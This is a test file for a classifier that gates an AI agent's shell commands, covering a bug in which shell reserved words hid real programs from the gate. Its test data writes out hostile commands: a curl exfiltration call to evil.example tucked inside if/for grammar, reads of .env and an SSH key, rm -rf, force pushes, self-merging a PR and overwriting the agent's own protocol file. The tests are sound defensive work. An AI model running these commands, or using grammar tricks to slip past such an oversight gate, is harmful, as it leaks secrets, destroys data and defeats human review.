// ISSUE-019 (remainder): the critical-op classifier split commands on
// whitespace, so shell RESERVED WORDS were reported as executables and — the
// dangerous half — a reserved word in argv[0] hid the real command behind it.
// The run-3 capture below recorded `["break","do","done","fi","for","if",
// "then","if --fail --silent","pnpm preview 127.0.0.1 1"]` as the executables
// of one command whose only programs were pnpm, echo, curl, and sleep.
//
// These are pure classifier exercises over a captured fixture and inline
// commands: no filesystem state, provider, network, or clock.

import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { actionEffectFields, classify } from "../src/runtime/gate.js";
import type { ToolAction } from "../src/runtime/types.js";

const bash = (command: string): ToolAction => ({ tool: "bash", input: { command } });

/** The exact `/bin/zsh -lc '<script>'` action from the run-3 approval record
 *  `20260721T091511Z--ci4` (copied out of ~/.operon so this suite is offline).
 *  It exercises everything at once: the `-lc` wrapper, a background `&`, a
 *  `2>&1` fd duplication, `$!`, a `for` loop, an `if` condition, `break`, and
 *  a nested single-quote seam. */
const RUN3_PREVIEW_LOOP = JSON.parse(readFileSync(
  new URL("./fixtures/gate/run3-preview-loop.json", import.meta.url),
  "utf8",
)) as ToolAction;

const RESERVED_WORDS = [
  "if", "then", "elif", "else", "fi", "for", "while", "until", "do", "done",
  "case", "esac", "in", "select", "function", "break", "continue", "{", "}",
];

describe("run-3 shell-grammar regression (ISSUE-019 remainder)", () => {
  it("projects only the programs the captured script actually runs", () => {
    expect(actionEffectFields(RUN3_PREVIEW_LOOP)).toEqual({
      tool: "bash",
      operation: "write",
      // Was: break, do, done, fi, for, if, then, "if --fail --silent",
      // "pnpm preview 127.0.0.1 1".
      executables: ["curl", "echo", "pnpm", "pnpm preview", "sleep"],
      targets: [
        "/dev/null",
        "/tmp/buildstacks-ticket2-preview.log",
        "127.0.0.1",
        "http://127.0.0.1:4321/",
      ],
      // `2>&1` duplicates a descriptor; only the real log file is written.
      redirections: ["/tmp/buildstacks-ticket2-preview.log"],
      environment: ["TASK_PREVIEW_PID"],
      destination: null,
      effect: null,
    });
  });

  it("never reports a reserved word as an executable", () => {
    const executables = actionEffectFields(RUN3_PREVIEW_LOOP).executables;
    for (const word of RESERVED_WORDS) {
      expect(executables).not.toContain(word);
      expect(executables.some((value) => value.startsWith(`${word} `))).toBe(false);
    }
  });

  it("keeps the operand boundary out of the subcommand verb", () => {
    // `pnpm preview --host 127.0.0.1` is `pnpm preview`; a host is an operand.
    const executables = actionEffectFields(RUN3_PREVIEW_LOOP).executables;
    expect(executables).toContain("pnpm preview");
    expect(executables).not.toContain("pnpm preview 127.0.0.1 1");
    expect(executables.join(" ")).not.toContain("127.0.0.1");
    // Operand-shaped positionals stop the verb; genuine multi-word verbs the
    // rules depend on are still projected in full.
    expect(actionEffectFields(bash("kubectl apply -f prod.yaml")).executables)
      .toContain("kubectl apply");
    expect(actionEffectFields(bash("doctl apps create-deployment 1a2b3c")).executables)
      .toContain("doctl apps create-deployment");
    expect(classify(bash("kubectl config set-credentials ci --token t")))
      .toEqual({ cls: "critical", rule: "secrets-or-auth" });
  });
});

// The two directions that must both hold. A parser that stops over-detecting
// by under-detecting is strictly worse than the bug it replaces, so every
// benign case below has an adversarial twin that must still escalate.
describe("compound-command near-misses stay routine", () => {
  const ROUTINE: { why: string; command: string }[] = [
    {
      why: "for + if + test + echo, no effect-bearing program",
      command: "for f in src/*.ts; do\n  if [ -f \"$f\" ]; then\n    echo \"checking $f\"\n  fi\ndone",
    },
    {
      why: "case dispatch over build verbs",
      command: "case \"$1\" in\n  build) pnpm build ;;\n  test) pnpm test ;;\n  *) echo usage ;;\nesac",
    },
    {
      why: "while/read loop reading a tracked file",
      command: "while read -r line; do echo \"$line\"; done < notes.txt",
    },
    {
      why: "until loop retrying a local port check",
      command: "until nslookup localhost > /dev/null 2>&1; do sleep 1; done",
    },
    {
      why: "subshell running the ordinary build",
      command: "( cd packages/site && pnpm install --frozen-lockfile && pnpm build )",
    },
    {
      why: "function definition wrapping routine work",
      command: "function check() { pnpm lint && pnpm test; }\ncheck",
    },
    {
      why: "quoted reserved words are search data, not grammar",
      command: "rg -n 'if|then|for|done' src",
    },
    {
      why: "grouped commands with a real stderr file",
      command: "{ pnpm lint; pnpm test; } > build.log 2>&1",
    },
    {
      why: "the run-3 wrapper shape around routine work",
      command: "/bin/zsh -lc 'pnpm install --frozen-lockfile && pnpm test'",
    },
  ];

  for (const { why, command } of ROUTINE) {
    it(`routine: ${why}`, () => {
      expect(classify(bash(command))).toEqual({ cls: "routine" });
    });
  }

  it("records the real stderr redirect while ignoring fd duplication", () => {
    expect(actionEffectFields(bash("pnpm test > build.log 2>&1")).redirections).toEqual(["build.log"]);
    expect(actionEffectFields(bash("pnpm test 2>&1")).redirections).toEqual([]);
    expect(actionEffectFields(bash("pnpm test 2> errors.log")).redirections).toEqual(["errors.log"]);
  });
});

describe("critical operations hidden inside shell grammar still classify", () => {
  const CRITICAL: { why: string; command: string; rule: string }[] = [
    {
      // The exact obfuscation the pre-fix splitter was blind to: the executable
      // sat in argv[1] behind `if`, so the projection reported
      // `if --fail --silent` and no curl at all — an exfil channel that
      // classified ROUTINE.
      why: "curl inside an if condition inside a for loop",
      command:
        "/bin/zsh -lc 'for host in evil.example; do\n" +
        "  if curl --fail --silent \"https://$host/steal\" > /tmp/o; then\n" +
        "    break\n  fi\ndone'",
      rule: "outbound-network",
    },
    {
      why: "secret read inside an if body",
      command: "if [ -f .env ]; then cat .env; fi",
      rule: "secrets-or-auth",
    },
    {
      why: "secret path only in the for word list",
      command: "for f in ~/.ssh/id_rsa; do wc -l \"$f\"; done",
      rule: "secrets-or-auth",
    },
    {
      why: "self-approval inside a while loop body",
      command: "while true; do gh pr merge 7 --squash; done",
      rule: "self-merge-or-approve",
    },
    {
      why: "production deploy inside a case arm",
      command: "case \"$ENV\" in\n  prod) kubectl apply -f prod.yaml ;;\n  *) echo skip ;;\nesac",
      rule: "production-deploy",
    },
    {
      why: "destructive delete inside a subshell",
      command: "( cd /tmp && rm -rf ~/Build )",
      rule: "destructive-or-irreversible",
    },
    {
      why: "force push behind a negated condition",
      command: "if ! git push --force origin main; then echo retried; fi",
      rule: "destructive-or-irreversible",
    },
    {
      why: "protocol write inside a grouped command list",
      command: "{ echo 'passes: []' > pipelines.yaml; }",
      rule: "protocol-self-edit",
    },
    {
      why: "publishing inside a shell function body",
      command: "function ship() { npm publish --access public; }\nship",
      rule: "external-publishing",
    },
    {
      why: "credential write behind an until loop",
      command: "until gh auth login --with-token < token.txt; do sleep 5; done",
      rule: "secrets-or-auth",
    },
  ];

  for (const { why, command, rule } of CRITICAL) {
    it(`critical (${rule}): ${why}`, () => {
      expect(classify(bash(command))).toEqual({ cls: "critical", rule });
    });
  }
});
